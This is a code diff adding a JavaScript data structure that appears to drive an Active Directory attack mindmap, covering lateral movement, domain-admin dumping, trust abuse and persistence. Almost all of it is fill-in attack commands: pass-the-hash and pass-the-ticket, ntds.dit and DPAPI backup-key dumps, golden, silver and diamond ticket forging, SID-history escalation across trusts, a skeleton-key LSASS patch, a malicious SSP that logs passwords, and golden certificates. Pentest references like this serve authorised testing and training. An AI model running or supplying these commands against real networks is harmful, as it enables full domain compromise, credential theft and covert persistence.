+              "irs.exe list; irs.exe exec -p <pid> -c <command>"
+            ] },
+            { label: "Impersonate with AD CS (Masky)", cmds: [
+              "masky -d <domain> -u <user> {-p <password> || -k || -H <hash>} -ca <certificate_authority> <ip>"
+            ], outcomes: [{ label: "NTLM", color: "#e8912e" }, { label: "Pass the hash / ticket / certificate", color: "#9ca3af" }] },
+            { label: "Impersonate an RDP session", cmds: [
+              "psexec.exe -s -i cmd",
+              "query user",
+              "tscon.exe <id> /dest:<session_name>"
+            ], outcomes: [{ label: "RDP", color: "#9ca3af" }] }
+          ],
+          outcomes: [{ label: "ACL", color: "#3b9ee5" }, { label: "User + Pass", color: "#4ade80" }],
+          moveTo: []
+        },
+        {
+          id: "aa-misc",
+          title: "Misc",
+          theory: null,
+          cve: null,
+          desc: "Other credential sources worth checking on a compromised host.",
+          cmds: [],
+          branches: [
+            { label: "Find users", cmds: [
+              "smbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\\Users' --dir-only --no-write-check --no-update --no-color --csv users_directory.csv"
+            ], outcomes: [{ label: "Username", color: "#3b9ee5" }] },
+            { label: "Extract KeePass", cmds: [
+              "KeePwn.py plugin add -u '<user>' -p '<password>' -d '<domain>' -t <target> --plugin KeeFarceRebornPlugin.dll",
+              "KeePwn.py trigger add -u '<user>' -p '<password>' -d '<domain>' -t <target>"
+            ], outcomes: [{ label: "User + Pass", color: "#4ade80" }] },
+            { label: "Hybrid (Azure AD Connect)", cmds: [
+              "azuread_decrypt_msol_v2.ps1   # dump the cleartext MSOL account password on the AD Connect server",
+              "nxc smb <ip> -u <user> -p <password> -M msol"
+            ], outcomes: [{ label: "DCSYNC", color: "#3b82f6" }] }
+          ],
+          outcomes: [],
+          moveTo: []
+        }
+      ]
+    },
+
+    {
+      id: "lateral-move",
+      title: "Lateral Move",
+      color: "#8a94a8",
+      tag: "Move across hosts",
+      desc: "Reuse a credential, hash, ticket, or certificate to execute on other hosts. Pick the technique that matches what you hold.",
+      techniques: [
+        {
+          id: "lm-cleartext",
+          title: "Clear text password",
+          theory: null,
+          cve: null,
+          desc: "Authenticate with a known password over the protocol available on the target.",
+          cmds: [],
+          branches: [
+            { label: "Interactive shell — PsExec", cmds: [
+              "psexec.py <domain>/<user>:<password>@<ip>",
+              "psexec.exe -AcceptEULA \\\\<ip>",
+              "psexecsvc.py <domain>/<user>:<password>@<ip>"
+            ], outcomes: [{ label: "Authority/System", color: "#9ca3af" }] },
+            { label: "Pseudo-shell (file write and read)", cmds: [
+              "atexec.py <domain>/<user>:<password>@<ip> \"command\"",
+              "smbexec.py <domain>/<user>:<password>@<ip>",
+              "wmiexec.py <domain>/<user>:<password>@<ip>",
+              "dcomexec.py <domain>/<user>:<password>@<ip>",
+              "nxc smb <ip_range> -u <user> -p <password> -d <domain> -x <cmd>"
+            ] },
+            { label: "WinRM", cmds: [
+              "evil-winrm -i <ip> -u <user> -p <password>",
+              "Enter-PSSession -ComputerName <computer> -Credential <domain>\\<user>",
+              "nxc winrm <ip_range> -u <user> -p <password> -d <domain> -x <cmd>"
+            ], outcomes: [{ label: "Low access", color: "#c3b4de" }, { label: "Admin", color: "#f4b6b6" }] },
+            { label: "RDP", cmds: ["xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>"], outcomes: [{ label: "Low access", color: "#c3b4de" }, { label: "Admin", color: "#f4b6b6" }] },
+            { label: "SMB", cmds: [
+              "smbclient.py <domain>/<user>:<password>@<ip>",
+              "smbclient-ng.py -d <domain> -u <user> -p <password> --host <ip>"
+            ], outcomes: [{ label: "Search files", color: "#9ca3af" }] },
+            { label: "MSSQL", cmds: [
+              "nxc mssql <ip_range> -u <user> -p <password>",
+              "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>"
+            ], outcomes: [{ label: "MSSQL", color: "#9ca3af" }] }
+          ],
+          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
+          moveTo: []
+        },
+        {
+          id: "lm-nthash",
+          title: "NT hash",
+          theory: null,
+          cve: null,
+          desc: "Pass the NT hash instead of a password (PtH), or overpass-the-hash to obtain a TGT.",
+          cmds: [],
+          branches: [
+            { label: "MSSQL / PseudoShell / PsExec / SMB / WinRM", cmds: [
+              "impacket: same as with creds, but use -hashes ':<hash>'",
+              "nxc: same as with creds, but use -H ':<hash>'"
+            ], outcomes: [{ label: "Admin", color: "#f4b6b6" }] },
+            { label: "Pass the Hash", cmds: [
+              'mimikatz "privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>"'
+            ], outcomes: [{ label: "Admin", color: "#f4b6b6" }] },
+            { label: "Pass the Hash — RDP (enable RestrictedAdmin first)", cmds: [
+              "reg.py <domain>/<user>@<ip> -hashes ':<hash>' add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'",
+              "xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>"
+            ], outcomes: [{ label: "Low access", color: "#c3b4de" }, { label: "Admin", color: "#f4b6b6" }] },
+            { label: "Pass the Hash — WinRM", cmds: ["evil-winrm -i <ip> -u <user> -H <hash>"], outcomes: [{ label: "Low access", color: "#c3b4de" }, { label: "Admin", color: "#f4b6b6" }] },
+            { label: "Overpass the Hash / Pass the Key (PTK)", cmds: [
+              "Rubeus.exe asktgt /user:victim /rc4:<rc4value>",
+              "Rubeus.exe ptt /ticket:<ticket>",
+              "Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe",
+              "getTGT.py <domain>/<user> -hashes :<hashes>"
+            ], outcomes: [{ label: "Admin", color: "#f4b6b6" }] }
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "lm-kerberos",
+          title: "Kerberos (ticket / key)",
+          theory: null,
+          cve: null,
+          desc: "Reuse a Kerberos ccache/kirbi ticket (PtT) or an AES key.",
+          cmds: [],
+          branches: [
+            { label: "Pass the Ticket (ccache / kirbi)", cmds: [
+              "ticketConverter.py <kirbi||ccache> <ccache||kirbi>   # convert format",
+              "export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache   # then impacket: use -k -no-pass",
+              'mimikatz kerberos::ptc "<ticket>"',
+              "Rubeus.exe ptt /ticket:<ticket>",
+              "proxychains secretsdump.py -k '<domain>/<user>@<ip>'"
+            ], outcomes: [{ label: "Admin", color: "#f4b6b6" }] },
+            { label: "Modify SPN of a ticket", cmds: [
+              'tgssub.py -in <ticket.ccache> -out <newticket.ccache> -altservice "<service>/<target>"   # PR 1256'
+            ], outcomes: [{ label: "PassTheTicket", color: "#9ca3af" }] },
+            { label: "AES key", cmds: [
+              "impacket: same as Pass the Hash but use -aesKey (and use the FQDN)",
+              "proxychains secretsdump.py -aesKey <key> '<domain>/<user>@<ip>'"
+            ], outcomes: [{ label: "Admin", color: "#f4b6b6" }] }
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "lm-socks",
+          title: "SOCKS (relay)",
+          theory: null,
+          cve: null,
+          desc: "Run tools through the SOCKS proxy of an ntlmrelayx session (-no-pass).",
+          cmds: [
+            "proxychains lookupsid.py <domain>/<user>@<ip> -no-pass -domain-sids",
+            "proxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> -no-pass   # MSSQL",
+            "proxychains secretsdump.py -no-pass '<domain>/<user>@<ip>'   # DCSYNC",
+            "proxychains smbclient.py -no-pass <user>@<ip>   # search files",
+            "proxychains atexec.py -no-pass <domain>/<user>@<ip> \"command\"   # Authority/System",
+            "proxychains smbexec.py -no-pass <domain>/<user>@<ip>   # Authority/System"
+          ],
+          outcomes: [{ label: "MSSQL", color: "#9ca3af" }, { label: "DCSYNC", color: "#3b82f6" }, { label: "Authority/System", color: "#f4b6b6" }],
+          moveTo: []
+        },
+        {
+          id: "lm-certificate",
+          title: "Certificate (pfx)",
+          theory: { label: "Shadow Credentials & PKINIT", url: "theory/2026-09-24-shadow-credentials-pkinit.html" },
+          cve: null,
+          desc: "Authenticate with a certificate via PKINIT or Schannel, and recover the NT hash (UnPAC-the-hash).",
+          cmds: [],
+          branches: [
+            { label: "UnPAC the hash", cmds: [
+              "certipy auth -pfx <crt_file> -dc-ip <dc_ip>",
+              "gettgtpkinit.py -cert-pfx <crt.pfx> -pfx-pass <crt_pass> <domain>/<dc_name> <tgt.ccache>",
+              "getnthash.py -key '<AS-REP encryption key>' '<domain>/<dc_name>'"
+            ] },
+            { label: "Pass the certificate — PKINIT", cmds: [
+              'gettgtpkinit.py -cert-pfx <pfx_file> [-pfx-pass "<cert-password>"] "<fqdn_domain>/<user>" "<tgt_ccache_file>"',
+              'Rubeus.exe asktgt /user:"<username>" /certificate:"<pfx_file>" [/password:"<certificate_password>"] /domain:"<fqdn-domain>" /dc:"<dc>" /show',
+              "certipy auth -pfx <crt_file> -dc-ip <dc_ip>"
+            ] },
+            { label: "Pass the certificate — Schannel", cmds: [
+              "certipy auth -pfx <pfx_file> -ldap-shell   # then add_computer, set RBCD",
+              "certipy cert -pfx <pfx_file> -nokey -out user.crt",
+              "certipy cert -pfx <pfx_file> -nocert -out user.key",
+              "passthecert.py -action ldap-shell -crt user.crt -key user.key -domain <domain> -dc-ip <dc_ip>"
+            ], outcomes: [{ label: "RBCD", color: "#12b886" }] }
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "lm-mssql",
+          title: "MSSQL",
+          theory: { label: "MSSQL Server Abuse", url: "theory/2026-09-24-mssql-server-abuse.html" },
+          cve: null,
+          desc: "Abuse SQL admin rights for command execution, impersonation, coercion, or linked-server hops.",
+          cmds: [
+            "nxc mssql <ip> -u <user> -p <password> -d <domain>   # find MSSQL access",
+            "MATCH p=(u:Base)-[:SQLAdmin]->(c:Computer) RETURN p   # BloodHound: who is SQL admin",
+            "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>"
+          ],
+          branches: [
+            { label: "enum_db" },
+            { label: "enable_xp_cmdshell → xp_cmdshell <cmd>", outcomes: [{ label: "Low Access", color: "#c3b4de" }] },
+            { label: "enum_impersonate → exec_as_user <user> / exec_as_login <login>", outcomes: [{ label: "MSSQL", color: "#9ca3af" }] },
+            { label: "xp_dir_tree <ip>", outcomes: [{ label: "COERCE SMB", color: "#ffe14a" }] },
+            { label: "trustlink → sp_linkedservers → use_link", outcomes: [{ label: "MSSQL", color: "#9ca3af" }, { label: "Trust", color: "#8faa6a" }] }
+          ],
+          outcomes: [],
+          moveTo: []
+        }
+      ]
+    },
+
+    {
+      id: "domain-admin",
+      title: "Domain Admin",
+      color: "#e0242a",
+      tag: "Own the domain",
+      desc: "You have Domain Admin (or DCSync rights). Dump the whole directory and grab the domain backup keys for total, persistent access.",
+      techniques: [
+        {
+          id: "da-ntds",
+          title: "Dump ntds.dit",
+          theory: null,
+          cve: null,
+          desc: "Extract every account hash from the domain database.",
+          cmds: [
+            "nxc smb <dc_ip> -u <user> -p <password> -d <domain> --ntds",
+            "secretsdump.py '<domain>/<user>:<pass>'@<ip>",
+            'ntdsutil "ac i ntds" "ifm" "create full c:\\temp" q q   # then: secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL -outputfile ntlm-extract',
+            "msf> windows/gather/credentials/domain_hashdump",
+            "mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator",
+            "certsync -u <user> -p '<password>' -d <domain> -dc-ip <dc_ip> -ns <name_server>"
+          ],
+          outcomes: [{ label: "Lateral move", color: "#9ca3af" }, { label: "Crack hash", color: "#e8912e" }],
+          moveTo: [{ section: "crack-hash", label: "Crack hash", note: "crack the dumped hashes offline" }]
+        },
+        {
+          id: "da-backup-keys",
+          title: "Grab backup keys",
+          theory: null,
+          cve: null,
+          desc: "Fetch the domain DPAPI backup key (PVK) to decrypt any user's DPAPI secrets domain-wide.",
+          cmds: [
+            "donpapi collect -H ':<hash>' <domain>/<user>@<ip_range> -t ALL --fetch-pvk"
+          ],
+          outcomes: [{ label: "Credentials", color: "#4ade80" }],
+          moveTo: []
+        }
+      ]
+    },
+
+    {
+      id: "trusts",
+      title: "Trusts",
+      color: "#6b8e4e",
+      tag: "Cross-domain / forest",
+      desc: "Enumerate trust relationships and abuse them to move between domains and forests — trust keys, SID history, golden tickets, and cross-forest ACLs.",
+      techniques: [
+        {
+          id: "tr-enum",
+          title: "Enumeration",
+          theory: { label: "Domain & Forest Trusts" },
+          cve: null,
+          desc: "Map the trust relationships and gather the domain SIDs you will need.",
+          cmds: [
+            "nltest.exe /trusted_domains",
+            "([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()",
+            "Get-DomainTrust -Domain <domain>",
+            "Get-DomainTrustMapping",
+            "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> trusts",
+            "sharphound.exe -c trusts -d <domain>   # MATCH p=(:Domain)-[:TrustedBy]->(:Domain) RETURN p",
+            "Get-DomainSID -Domain <domain>; Get-DomainSID -Domain <target_domain>",
+            "lookupsid.py -domain-sids <domain>/<user>:<password>@<dc> 0"
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "tr-child-parent",
+          title: "Child → Parent (intra-forest)",
+          theory: { label: "Domain & Forest Trusts" },
+          cve: null,
+          desc: "Escalate from a child domain to the forest root using the trust key or the child krbtgt, adding the Enterprise Admins SID (-519) via SID history.",
+          cmds: [],
+          branches: [
+            { label: "Trust key", cmds: [
+              "mimikatz lsadump::trust /patch",
+              "mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /aes256:<trust_key_aes256> /sids:<target_domain_sid>-519 /service:krbtgt /target:<target_domain> /ptt",
+              "secretsdump.py -just-dc-user '<parent_domain>$' '<domain>/<user>:<password>@<dc_ip>'",
+              "ticketer.py -nthash <trust_key> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 -spn krbtgt/<parent_domain> trustfakeuser"
+            ], outcomes: [{ label: "PassTheTicket", color: "#9ca3af" }] },
+            { label: "Golden ticket", cmds: [
+              "mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\\krbtgt",
+              "mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-519 /ptt",
+              "raiseChild.py <child_domain>/<user>:<password>",
+              "ticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 goldenuser"
+            ], outcomes: [{ label: "PassTheTicket", color: "#9ca3af" }] },
+            { label: "Unconstrained delegation", note: "Coerce the parent DC onto the child DC.", outcomes: [{ label: "Unconstrained delegation", color: "#26bd8a" }] }
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "tr-parent-child",
+          title: "Parent → Child",
+          theory: { label: "Domain & Forest Trusts" },
+          cve: null,
+          desc: "Same techniques as Child → Parent, applied in the other direction.",
+          cmds: [],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "tr-external",
+          title: "External / forest trust",
+          theory: { label: "Domain & Forest Trusts" },
+          cve: null,
+          desc: "Abuse a two-way or one-way trust: password reuse, foreign group memberships, SID history (where SID filtering allows), and cross-forest ADCS / unconstrained delegation.",
+          cmds: [],
+          branches: [
+            { label: "Password reuse across the trust", outcomes: [{ label: "Lateral move (creds/pth)", color: "#9ca3af" }] },
+            { label: "Foreign group and users", cmds: [
+              'MATCH p=(n:User {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p',
+              'MATCH p=(n:Group {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain RETURN p'
+            ], outcomes: [{ label: "ACL", color: "#3b9ee5" }] },
+            { label: "SID history on B — golden ticket", cmds: [
+              "mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\\krbtgt",
+              "mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-<GROUP_SID_SUP_1000> /ptt",
+              "ticketer.py -nthash <krbtgt> -domain-sid <domain_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid_sup_1000> fakeuser"
+            ], outcomes: [{ label: "PassTheTicket", color: "#9ca3af" }] },
+            { label: "SID history on B — trust ticket", cmds: [
+              "secretsdump.py -just-dc-user 'domainB$' '<domainA>/<user>:<password>@<dc_a>'",
+              "ticketer.py -nthash <trust_hash> -domain-sid <sid_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid_sup_1000> -spn krbtgt/<domain_a> fakeuser"
+            ], outcomes: [{ label: "PassTheTicket", color: "#9ca3af" }] },
+            { label: "ADCS abuse — unconstrained delegation", note: "Coerce dc_b onto dc_a, then abuse ADCS across the trust.", outcomes: [{ label: "Unconstrained delegation", color: "#26bd8a" }, { label: "AD CS", color: "#c026d3" }] }
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "tr-mssql-links",
+          title: "MSSQL links",
+          theory: { label: "MSSQL Server Abuse", url: "theory/2026-09-24-mssql-server-abuse.html" },
+          cve: null,
+          desc: "Linked SQL servers ignore the AD trust boundary — crawl them to execute across domains.",
+          cmds: [
+            "Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance>",
+            "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>   # trustlink -> sp_linkedservers -> use_link"
+          ],
+          outcomes: [{ label: "MSSQL", color: "#9ca3af" }],
+          moveTo: []
+        }
+      ]
+    },
+
+    {
+      id: "persistence",
+      title: "Persistence",
+      color: "#c8862e",
+      tag: "Keep access",
+      desc: "Techniques to keep privileged access after compromise. Most require Domain Admin or the krbtgt / CA key — use only where authorised, and remember to clean up.",
+      techniques: [
+        {
+          id: "pe-add-da",
+          title: "Add a Domain Admin",
+          theory: null,
+          cve: null,
+          desc: "Add an account to Domain Admins (noisy — easily detected).",
+          cmds: [
+            'net group "domain admins" myuser /add /domain'
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "pe-golden",
+          title: "Golden ticket",
+          theory: null,
+          cve: null,
+          desc: "Forge TGTs with the krbtgt key — valid for any user until krbtgt is rotated twice.",
+          cmds: [
+            "ticketer.py -aesKey <aeskey> -domain-sid <domain_sid> -domain <domain> anyuser",
+            'mimikatz "kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid> /aes256:<krbtgt_aes256> /ptt"'
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "pe-silver",
+          title: "Silver ticket",
+          theory: null,
+          cve: null,
+          desc: "Forge a service ticket with a service/computer account key — grants access to that one service without touching a DC.",
+          cmds: [
+            'mimikatz "kerberos::golden /sid:<domain-sid> /domain:<domain> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt"',
+            "ticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> -spn <service> anyuser"
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "pe-dsrm",
+          title: "Directory Service Restore Mode (DSRM)",
+          theory: null,
+          cve: null,
+          desc: "Enable the DSRM local admin of a DC to log on over the network with its (dumpable) hash.",
+          cmds: [
+            'PowerShell New-ItemProperty "HKLM\\System\\CurrentControlSet\\Control\\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD'
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "pe-skeleton",
+          title: "Skeleton Key",
+          theory: null,
+          cve: null,
+          desc: "Patch LSASS on a DC so every account also accepts a master password (in memory only).",
+          cmds: [
+            'mimikatz "privilege::debug" "misc::skeleton" "exit"   # master password: mimikatz'
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "pe-ssp",
+          title: "Custom SSP",
+          theory: null,
+          cve: null,
+          desc: "Register a malicious Security Support Provider to log every plaintext credential.",
+          cmds: [
+            'mimikatz "privilege::debug" "misc::memssp" "exit"',
+            "C:\\Windows\\System32\\kiwissp.log"
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "pe-golden-cert",
+          title: "Golden certificate",
+          theory: { label: "Shadow Credentials & PKINIT", url: "theory/2026-09-24-shadow-credentials-pkinit.html" },
+          cve: null,
+          desc: "Steal the CA private key and forge certificates for any account indefinitely.",
+          cmds: [
+            "certipy ca -backup -ca '<ca_name>' -username <user>@<domain> -hashes <hash>",
+            "certipy forge -ca-pfx <ca_private_key> -upn <user>@<domain> -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>'"
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "pe-diamond",
+          title: "Diamond ticket",
+          theory: null,
+          cve: null,
+          desc: "Modify a legitimate TGT's PAC with the krbtgt key — stealthier than a golden ticket.",
+          cmds: [
+            "ticketer.py -request -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid> -user-id <user_id> -groups '512,513,518,519,520' anyuser"
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "pe-sapphire",
+          title: "Sapphire ticket",
+          theory: null,
+          cve: null,
+          desc: "Request a ticket while impersonating a privileged user via S4U, keeping a legitimate PAC.",
+          cmds: [
+            "ticketer.py -request -impersonate <anyuser> -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid> 'ignored'"
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "pe-dcshadow",
+          title: "DCShadow",
+          theory: null,
+          cve: null,
+          desc: "Register a rogue DC to push directory changes (e.g. add SID history or a primary group) that replicate without normal logging.",
+          cmds: [],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "pe-acl",
+          title: "ACL manipulation",
+          theory: null,
+          cve: null,
+          desc: "Plant durable rights (DCSync, GenericAll, AdminSDHolder) so access can be re-established later.",
+          cmds: [],
+          outcomes: [],
+          moveTo: [{ section: "acls-aces", label: "ACLs / ACEs permissions", note: "grant yourself abusable rights for later" }]
+        }
+      ]
     }
   ]
 };
